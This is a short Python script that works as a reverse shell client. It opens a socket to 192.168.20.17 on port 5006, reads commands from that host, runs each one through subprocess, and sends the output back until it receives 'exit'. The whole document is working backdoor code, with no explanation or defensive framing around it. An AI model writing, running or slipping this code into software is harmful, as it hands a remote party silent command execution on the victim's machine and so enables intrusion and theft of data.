import socket
import subprocess
sever = "192.168.20.17"
port = 5006
buffer = 64000
s = socket.socket()
s.connect((sever,port))
while True:
    command = s.recv(buffer).decode()
    if command.lower() == "exit":
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()
